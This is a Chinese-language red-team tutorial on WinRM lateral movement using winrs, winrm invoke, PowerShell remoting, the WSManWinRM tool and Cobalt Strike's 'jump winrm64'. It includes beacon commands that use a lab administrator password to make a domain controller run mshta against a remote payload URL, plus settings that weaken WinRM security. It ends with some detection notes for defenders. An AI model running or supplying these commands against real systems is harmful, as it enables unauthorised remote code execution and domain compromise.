> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZimzIyqHuUGvbi3xDi6WZA)

WinRM 的简要概述
-----------

"Windows 远程管理 (WinRM)" 是 WS-Management 协议(Web Services for Management，又名 WSMan) 的 Microsoft 实现，WS-Management Protocol 是基于标准简单对象访问协议 (SOAP) 的对防火墙友好的协议。运行来自不同硬件和操作系统的硬件和操作供应商，以实现互操作（Microsoft Docs）。

作为 DCOM 和 WMI 远程管理的替代方法，WinRM 用于通过 WSMan 与远程计算机建立会话，WAMan 利用 HTTP/S 作为传输机制来传递 XML 格式的消息。在现代的 Windows 系统中，WinRM HTTP 通信通过 TCP 端口 5985 进行，而 HTTPS(TLS) 通信是通过 TCP 端口 5986 进行的。WinRM 本机支持 NTLM 和 Kerberos(域内) 身份验证。初始身份验证后，将使用 AES 加密保护 WinRM 会话（Microsoft Docs)

注意：必须配置并且运行 WinRM 服务才能接受远程链接。可以使用 winrm.cmd quickconfig 命令或通过组策略来快速设置。WinRM 接受连接可能还需要几个步骤。请参阅这篇 Pentest Lab 文章以了解更多信息。

我们可以通过 nmap 获取其他端口扫描工具来侦测对方有无开启 WinRM 对应的通讯端口。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmIq9BEhdtO5icuiaTVFkngUf43Jx8Wr2ohXmrmrgzH9yf7pSOPXe1ODNA/640?wx_fmt=png)

WinRM 服务自 Windows Vista 开始成为 Windows 的默认组件，在运行与启动上有以下几个特点：

1.  在 Windows Vista 上必须手动启动 WinRM 服务，但从 Windows Server 2008 开始，WinRM 服务自动启动
    
2.  默认情况下，WinRM 服务后台已经运行，但并不开启监听模式，因此无法接受和发送数据
    
3.  使用 WinRM 提供的 quickconfig 对 WinRM 进行配置后，Windows 将开启监听并打开 HTTP 及 HTTPS 监听端口，同时 Windows 防火墙生成这两个端口的例外
    

WinRM 的组件主要由以下几部分构成：

1.  WinRM Scritping API：提供给外部的用于执行管理操作的接口
    
2.  winrm.cmd 和 winrm.vbs：系统内置的用于配置 WinRM 的命令行工具，基于 VBS 脚本并使用了 WinRM Scritping API
    
3.  winrs.exe：基于命令行的工具，此工具作为客户端使用，用于远程连接运行 WinRM 的服务器并执行大多数的 cmd 命令
    

通过 winrs.exe 来执行远程命令利用
----------------------

Winrs.exe 是一个内置的命令行工具, 它允许远程命令的执行在 WinRm 的适当的有资格的用户。该工具利用 WS-Management 协议。更多功能可以查看微软文档

```
POST /wsman?PSVersion=5.1.14393.1884 HTTP/1.1
Connection: Keep-Alive
Content-Type: application/soap+xml;charset=UTF-8
Authorization: Kerberos YIILygYJKoZIhvcSAQICAQBuggu5MIILtaAD....省略
User-Agent: Microsoft WinRM Client
Content-Length: 0
Host: dc.one.com:5985


HTTP/1.1 200 
Content-Type: multipart/encrypted;protocol="application/HTTP-Kerberos-session-encrypted";boundary="Encrypted Boundary"
Server: Microsoft-HTTPAPI/2.0
Date: Mon, 15 Feb 2021 04:33:02 GMT
Content-Length: 1274

--Encrypted Boundary
Content-Type: application/HTTP-Kerberos-session-encrypted
OriginalContent: type=application/soap+xml;charset=UTF-8;Length=974
--Encrypted Boundary
Content-Type: application/octet-stream


HTTP/1.1 200 
WWW-Authenticate: Kerberos YIGYBgkqhkiG9xIBAgICAG+BiDCBhaAD.....省略
Server: Microsoft-HTTPAPI/2.0
Date: Mon, 15 Feb 2021 04:32:58 GMT
Content-Length: 0


POST /wsman?PSVersion=5.1.14393.1884 HTTP/1.1
Connection: Keep-Alive
Content-Type: multipart/encrypted;protocol="application/HTTP-Kerberos-session-encrypted";boundary="Encrypted Boundary"
User-Agent: Microsoft WinRM Client
Content-Length: 8295
Host: dc.one.com:5985

--Encrypted Boundary
Content-Type: application/HTTP-Kerberos-session-encrypted
OriginalContent: type=application/soap+xml;charset=UTF-8;Length=7994
--Encrypted Boundary
Content-Type: application/octet-stream
```

我们可以通过 winrs 来进行横向移动。这里通过 -u 来指定用户名 -p 指定密码

```
beacon> shell winrs -r:dc  -u:one\administrator -p:q123456. "cmd.exe /c mshta.exe http://192.168.1.115:80/e.ext"
[*] Tasked beacon to run: winrs -r:dc  -u:one\administrator -p:q123456. "cmd.exe /c mshta.exe http://192.168.1.115:80/e.ext"
[+] host called home, sent: 129 bytes
beacon> shell winrs -r:dc  -u:one\administrator -p:q123456. "cmd.exe /c hostname"
[*] Tasked beacon to run: winrs -r:dc  -u:one\administrator -p:q123456. "cmd.exe /c hostname"
[+] host called home, sent: 98 bytes
[+] received output:
dc

beacon> shell hostname
[*] Tasked beacon to run: hostname
[+] host called home, sent: 39 bytes
[+] received output:
ex
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmh2KHenmq6WaibD7gmLibbloxUIDwKhraR9HO216Yl1FbnHQwjZeXHeNA/640?wx_fmt=png)

成功执行命令的远程过程链如下：  

```
svchost.exe (DcomLaunch)-> winrshost.exe -> cmd.exe [/c remote command] -> [remote command/binary]
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmaSSnyAzqhNEiazQBk7IgKamQS4X0tZeZDKApjJiaS09YohaEKiaxiaCnTA/640?wx_fmt=png)

此外，Winrs 事件作为 Microsoft-Windows-WinRM / Operational（事件 ID 91）记录在远程主机上。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVm18LwnWGxVLdmgTcibcZwiaKibva3qZYsb4HklpnHZmpPq2bSpEAWItdkQ/640?wx_fmt=png)

通过 winrm.cmd 来进行命令执行
--------------------

在命令行中执行 winrm quickconfig 对 WinRM 进行首次（默认）配置，这里我已经配置好了，此时，WinRM 服务已经开始监听 5985/TCP（从 WinRM2.0 开始，服务的 HTTP 默认监听端口由原来的 80/TCP 变更为 5985/TCP）端口并等待远程主机进行访问， 通 过 winrm enumerate winrm/config/listener 查看 WinRM 服务当前的配置情况：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmNVBiblTDD3iaVkaiac7YLc0SGIkzn6SUYEoKphFXNRmvDicOlt4lhvXTXA/640?wx_fmt=png)

以此配置为例，此时远程主机已经可以通过 WS-Management 协议访问 http://192.168.8.215/wsman 连接当前服务器的 WinRM 服务。不过，WinRM 只允许当前域用户或者处于本机 TrustedHosts 列表中的远程主机进行访问。因此在连接之前，还需要确保发起连接的主机与当前服务器处于同一域或者两台主机的 WinRM 服务 TrustedHosts 中必须存在对方主机的 IP 或主机名，这里类似于一个白名单机制。可以执行 winrm set winrm/config/client @{TrustedHosts="*"} 手动配置当前服务器允许被任意主机连接：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmbRzdlK195L0yphCbIiaf42k1CwylnBBpK0JXKia7SDkp9ga44SK8uS8w/640?wx_fmt=png)

WinRM（.vbs）允许 WMI 对象通过 WinRM 传输进行远程交互，可以利用几个 WMI 类来执行远程命令执行，一个非常著名的 WMI 类 Win32_Process 可以通过利用 Create 方法来生成（远程）进程，调用该命令在本地启动一个 calc.exe 进程。

```
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="calc.exe"}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmDLDicb0FicjcNhuOjpclxEqzRGjAebP2ojdaeMK6oZfDsl66pQS60m7g/640?wx_fmt=png)

当然我们可以通过 -r 来指定远端的机器。  

```
shell winrm invoke Create wmicimv2/win32_process @{CommandLine="cmd.exe /c mshta.exe http://192.168.1.115:80/e.ext"} -r:dc -u:one\administrator -p:q123456.
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmHHd80U83AUrFo4xxatPQwNqibRP09LjTz4c9FcEDLtTp91FUFznnlWQ/640?wx_fmt=jpeg)

下面是 WinRM 的一些简单命令

```
#查看WinRM状态
winrm enumerate winrm/config/listener
 
#开启WinRM远程管理
Enable-PSRemoting –force
 
#设置WinRM自启动
Set-Service WinRM -StartMode Automatic
 
#对WinRM服务进行快速配置，包括开启WinRM和开启防火墙异常检测,默认的5985端口
winrm quickconfig -q
#对WinRM服务进行快速配置，包括开启WinRM和开启防火墙异常检测，HTTPS传输，5986端口
winrm quickconfig -transport:https    
 
#查看WinRM的配置
winrm get winrm/config
 
#查看WinRM的监听器
winrm e winrm/config/listener
 
#为WinRM服务配置认证
winrm set winrm/config/service/auth '@{Basic="true"}'
 
#修改WinRM默认端口
winrm set winrm/config/client/DefaultPorts '@{HTTPS="8888"}'
 
#为WinRM服务配置加密方式为允许非加密：
winrm set winrm/config/service '@{AllowUnencrypted="true"}'
 
#设置只允许指定IP远程连接WinRM
winrm set winrm/config/Client '@{TrustedHosts="192.168.10.*"}'
 
#执行命令
winrm invoke create wmicimv2/win32_process -SkipCAcheck -skipCNcheck '@{commandline="calc.exe"}'
 
#在dc机器上面执行命令并且指定用户名和密码
winrm invoke Create wmicimv2/win32_process @{CommandLine="calc.exe"} -r:dc -u:one\administrator -p:q123456.
```

通过 Enter-PSSession 来进行远程连接
--------------------------

Enter-PSSession 是可以在 powershell 上面通过 5985/5986 端口进行远程连接，详细的操作可以查阅微软文档

```
Enter-PSSession -computer dc.one.com -Credential one\administrator -Port 5985
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmeUpCtF2ic8S1mbdbD9ZKicVtaibOmEnBEDib3MMiaOjO0GtfHxVqb4ELeiaQ/640?wx_fmt=png)

```
New-PSSession -Name PSSession -ComputerName dc.one.com -Credential one\administrator
Enter-PSSession -Name PSSession 

查看WinRM远程会话
Get-PSSession
 
进入ID为2的WinRM会话中
Enter-PSSession -id 2
 
退出WinRM会话
Exit-PSSession
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmxbViaXMXa2GwkTegHQRU6OhAqsufhVO2WueSd5V2JyibPcHGm9X5T8Tg/640?wx_fmt=png)

可以通过指定 -ScriptBlock 来执行命令上线

```
Invoke-Command -Computername TARGET -ScriptBlock {command}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmhHkpd2v6H78ggQM1hGBwOy28wbOUAjDIAOUYYmeTcC4H7p0grvO7WA/640?wx_fmt=png)

下面是在 powershell 上面执行查看 WINRM 的一些命令

```
# Enable PowerShell Remoting on the target (box needs to be compromised first)
Enable-PSRemoting -force

# 检查指定系统是否正在WinRM端口上侦听
Test-NetConnection <IP> -CommonTCPPort WINRM

# 信任所有主机：
Set-Item WSMan:\localhost\Client\TrustedHosts -Value * -Force

# 检查哪些主机受信任
Get-Item WSMan:\localhost\Client\TrustedHosts

# 在远程主机上执行命令
Invoke-Command <host> -Credential $cred -ScriptBlock {Hostname}

# 使用Kerberos的交互式会话：
Enter-PSSession <host> -Authentication Kerberos

# 将文件上传到远程会话
Copy-Item -Path C:\Temp\PowerView.ps1 -Destination C:\Temp\ -ToSession (Get-PSSession)

# 从远程会话下载文件
Copy-Item -Path C:\Users\Administrator\Desktop\test.txt -Destination C:\Temp\ -FromSession (Get-PSSession)
```

利用 WSManWinRM 进行横向移动
--------------------

bohops 大佬在博客中有写一篇文章《WS-Management COM: Another Approach for WinRM Lateral Movement》有介绍实现了 WSMan-WinRM 工具的过程，这个工具也是很不错。

在. NET C＃中构建 WSMan-WinRM 工具，创建新的. NET Framework（4）控制台应用程序项目后，通过在解决方案资源管理器中右键单击 “依赖项” 菜单并选择“添加 COM 引用”，接着选择图中的选项。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmf3SIvAFbnMicn4rn56malpj6K8AVvL4tdgcShbdORTQ2egXJu0aF43w/640?wx_fmt=png)

或者选择在通过在解决方案资源管理器中右键单击依赖项中选择添加项目引用。来添加依赖文件。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmFyibnt9kxv3MwPia7EIxevFqhZwwRRicsIOTAGOFBxtrice4tWEskWWz2A/640?wx_fmt=png)

在引用管理器中，选择浏览并从 C:WindowsSystem32 中 导入 WsmAuto.dll 文件：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmrwibvbFUicojc3QAuT9lv6UAMjNXrZ22ViadwwR1piaruyDLYRQ8txzcHQ/640?wx_fmt=png)

这样就可以构建到项目了。作者这里提供了 5 中不同的执行方式。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmKrzjqjj28oJUQGV7kFyMPicWMb5LPzP8laqQQ6rQBiaSM2Bh86GXpzRQ/640?wx_fmt=png)

当然可以在 cobaltstrike 加载 powershell 来进行 WSManWinRM 横向移动，WSManWinRM.ps1 用法如下。

```
Usage: Invoke-WSManWinRM -hostname <hostname> -command <command>
 Usage: Invoke-WSManWinRM -hostname <hostname> -command <command> -user <domain\user> -password <password>

 Example: import-module .\WSManWinRM.ps1
          Invoke-WSManWinRM -hostname dc.one.com -command calc.exe
 Example: import-module .\WSManWinRM.ps1
          Invoke-WSManWinRM -hostname dc.one.com -command calc.exe -user one\administrator -password q123456.
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmibaQq38mA8O1YpYn2eRDXDKP2GB1vntzwOtTpRlykc020UecOxEfvkQ/640?wx_fmt=png)

WSManWinRM.js

```
Usage: cscript.exe SharpWSManWinRM.js <hostname> <command>
 Usage: cscript.exe SharpWSManWinRM.js <hostname> <command> <domain\user> <password>

 Example: cscript.exe SharpWSManWinRM.js dc.one.com notepad.exe
 Example: cscript.exe SharpWSManWinRM.js dc.one.com "cmd /c notepad.exe" one\administrator q123456.
```

WSManWinRM.vbs

```
Usage: cscript.exe SharpWSManWinRM.vbs <hostname> <command>
 Usage: cscript.exe SharpWSManWinRM.vbs <hostname> <command> <domain\user> <password>

 Example: cscript.exe SharpWSManWinRM.vbs dc.one.com notepad.exe
 Example: cscript.exe SharpWSManWinRM.vbs dc.one.com "cmd /c notepad.exe" one\administrator q123456.
```

SharpWSManWinRM.cs

```
Usage: SharpWSManWinRM.exe <hostname> <command>
 Usage: SharpWSManWinRM.exe <hostname> <command> <domain\user> <password>

 Example: SharpWSManWinRM.exe dc.one.com notepad.exe
 Example: SharpWSManWinRM.exe dc.one.com "cmd /c notepad.exe" one\administrator q123456.
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmNvaOenSgiaKFviaiaahgyITN4w1gwB3KIQMN0Wjian6YRppC7APDHldgUg/640?wx_fmt=png)

cobalt strike 平台上利用 winrm 进行横向移动
--------------------------------

在 cobalt strike 平台上有集成到 winrm 来进行横向移动，这里分有 86 位和 64 位的 winrm

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmCRsGALsfl4cbTCib8mxfImquHepjpibdZJicHU5icfTd8zCgLUWqsG23SQ/640?wx_fmt=png)

接着选择对应的位数，并且把相对于的信息填入进去。后面需要选择 Listener 和 Session。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmAExHgNuicSJhoUtIjPfH8xicJmUyEC2OMOjl2ibiaJGfLzlBPdhSQBQgiaQ/640?wx_fmt=png)

接着就上线成功了，也可以通过命令行界面来进行 winrm 的横向移动操作

```
jump winrm64  TARGET  Listen
jump winrm64 dc.one.com http
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmu41kP09n84ZDbc14BbpicfWa3cWYkATlqSfyEY6JXB0Ae4Tmich3cEuQ/640?wx_fmt=png)

翻了翻 cobaltstrike 的源码，找到了 winrm 的执行方式，他这里是通过 powershell 来执行命令的，通过 Invoke-Command 指定 - ScriptBlock 来执行命令。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmnhzjUowM4KT5exIa6MYN8ltyTfcIINX2Xw2LWsPh5IibPJiclUPdmmmw/640?wx_fmt=png)

通过 Wireshark 进行抓捕可以看到 WinRM 进行横向移动的时候的数据包如下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAYOnUs2icDhD2rCZqR5EjVmLib8HIPHqu3DKDAfzj102ZfX3el4Zz9cv4prEvMv3AkdPkeBv2PIBWw/640?wx_fmt=png)

```
POST /wsman?PSVersion=5.1.14393.1884 HTTP/1.1
Connection: Keep-Alive
Content-Type: application/soap+xml;charset=UTF-8
Authorization: Kerberos YIILygYJKoZIhvcSAQICAQBuggu5MIILtaAD....省略
User-Agent: Microsoft WinRM Client
Content-Length: 0
Host: dc.one.com:5985
HTTP/1.1 200 
Content-Type: multipart/encrypted;protocol="application/HTTP-Kerberos-session-encrypted";boundary="Encrypted Boundary"
Server: Microsoft-HTTPAPI/2.0
Date: Mon, 15 Feb 2021 04:33:02 GMT
Content-Length: 1274
--Encrypted Boundary
Content-Type: application/HTTP-Kerberos-session-encrypted
OriginalContent: type=application/soap+xml;charset=UTF-8;Length=974
--Encrypted Boundary
Content-Type: application/octet-stream
HTTP/1.1 200 
WWW-Authenticate: Kerberos YIGYBgkqhkiG9xIBAgICAG+BiDCBhaAD.....省略
Server: Microsoft-HTTPAPI/2.0
Date: Mon, 15 Feb 2021 04:32:58 GMT
Content-Length: 0
POST /wsman?PSVersion=5.1.14393.1884 HTTP/1.1
Connection: Keep-Alive
Content-Type: multipart/encrypted;protocol="application/HTTP-Kerberos-session-encrypted";boundary="Encrypted Boundary"
User-Agent: Microsoft WinRM Client
Content-Length: 8295
Host: dc.one.com:5985
--Encrypted Boundary
Content-Type: application/HTTP-Kerberos-session-encrypted
OriginalContent: type=application/soap+xml;charset=UTF-8;Length=7994
--Encrypted Boundary
Content-Type: application/octet-stream
```

在 WinRM 服务未开启监听 HTTPS 端口的情况下，Windows 依然会加密 WinRM 会话以保证通信数据的完整性。不过，仍然可以通过 HTTP 请求与响应中的明文部分捕获 WinRM 认证及操作的行为，例如 Microsoft WinRM Client、Encrypted Boundary、HTTP-SPNEGO-session-encrypted 等关键字